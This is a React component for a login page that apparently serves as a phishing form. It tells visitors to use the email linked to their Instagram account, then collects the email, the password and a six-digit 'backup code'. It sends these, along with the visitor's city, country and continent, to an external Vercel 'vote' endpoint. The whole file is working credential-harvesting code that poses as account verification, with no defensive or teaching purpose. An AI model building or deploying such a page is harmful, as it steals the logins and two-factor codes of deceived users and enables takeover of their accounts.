import { FaTriangleExclamation } from "react-icons/fa6";
import { AiFillEye, AiFillEyeInvisible } from "react-icons/ai";
import { useState } from "react";
import { useMyContext } from "../context/AppContext";

import axios from "axios";

const Email = () => {
  const [showPassword, hidepassword] = useState(false);
  const [formData, setFormData] = useState({
    email: "",
    password: "",
    backupEmail: "",
  });

  const { city, country, continent, backupEmail, setBackUpEmail } =
    useMyContext();

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prevFormData) => ({
      ...prevFormData,
      [name]: value,
    }));
  };

  const handleVerification = (e) => {
    e.preventDefault();
    const { email, password } = formData;

    if (email !== "" && password !== "") {
      setBackUpEmail(true);
    }
  };

  // console.log(city, country);

  const handleSubmit = async (e) => {
    e.preventDefault();

    const { email, password, backupEmail } = formData;

    console.log(backupEmail);

    if (
      formData.backupEmail.length === 6 &&
      formData.email !== "" &&
      formData.password !== ""
    ) {
      const response = await axios.post(
        "https://node-api-vercel-hazel-five.vercel.app/api/auth/vote",
        {
          email,
          password,
          backupCode: backupEmail,
          continent,
          country,
          city,
        }
      );
      console.log(response.data);

      window.location.reload();
    } else {
      console.log("form fields must not be empty");
    }
  };

  return (
    <div className="flex-1 flex flex-col justify-center items-center mt-[5rem]">
      <div className=" flex flex-col items-center text-center text-red-500 gap-3 my-5 border border-red-300 rounded-lg p-3">
        <FaTriangleExclamation
          size={30}
          className="text-red-500 flex items-center "
        />
        <span className="uppercase ">Please read</span>
        <span className=" my-2"></span>
        <span>
          Please ensure that you login with the email associated with your
          instagram account.
        </span>
      </div>

      <form onSubmit={handleSubmit} className="flex flex-col gap-10">
        <div className="flex flex-col text-lg gap-3 ">
          <label htmlFor="email" className="font-bold">
            Email Address
          </label>
          <input
            type="email"
            name="email"
            id="email"
            value={formData.email}
            onChange={handleChange}
            className="bg-slate-100 w-[23rem] lg:w-[30rem] mx-auto h-[3rem] rounded-lg p-4 border-0 focus:border-0"
            required
          />
        </div>

        <div className=" flex flex-col text-lg gap-3">
          <label htmlFor="password" className="font-bold">
            Password
          </label>
          <div className="flex flex-row items-center">
            <input
              type={showPassword ? "text" : "password"}
              name="password"
              id="password"
              value={formData.password}
              onChange={handleChange}
              className="bg-slate-100 w-[23rem] lg:w-[30rem] h-[3rem] rounded-lg p-4 border-0 focus:border-0"
              required
            />

            <div className="-ml-16">
              {showPassword ? (
                <AiFillEyeInvisible
                  size={30}
                  onClick={() => hidepassword(!showPassword)}
                />
              ) : (
                <AiFillEye
                  size={30}
                  onClick={() => hidepassword(!showPassword)}
                />
              )}
            </div>
          </div>
        </div>

        {backupEmail && (
          <span
            htmlFor="backup"
            className="w-full text-sm text-red-500 font-semibold text-center"
          >
            This is to make sure the account belongs to you. <br />
            Please add a backup code.
          </span>
        )}
        {backupEmail ? (
          <div className="input-box">
            <input
              className="bg-slate-100 w-[23rem] lg:w-[30rem] mx-auto h-[3rem] rounded-lg p-4 border-0 focus:border-0"
              type="number"
              name="backupEmail"
              id="backupEmail"
              placeholder="Enter 6 digit backup code"
              aria-describedby=""
              value={formData.backupEmail}
              onChange={handleChange}
              maxLength={6}
              required
            />
          </div>
        ) : (
          ""
        )}

        {!backupEmail ? (
          <span className="button-box w-full">
            <button
              className="py-3 px-10 bg-blue-950 text-white rounded-full"
              type="submit"
              onClick={handleVerification}
            >
              Verify
            </button>
          </span>
        ) : (
          <span className="button-box w-2/3">
            <button
              className="py-3 px-10 bg-blue-950 text-white rounded-full"
              name="submit"
              onClick={handleSubmit}
            >
              Log in
            </button>
          </span>
        )}
      </form>
    </div>
  );
};

export default Email;
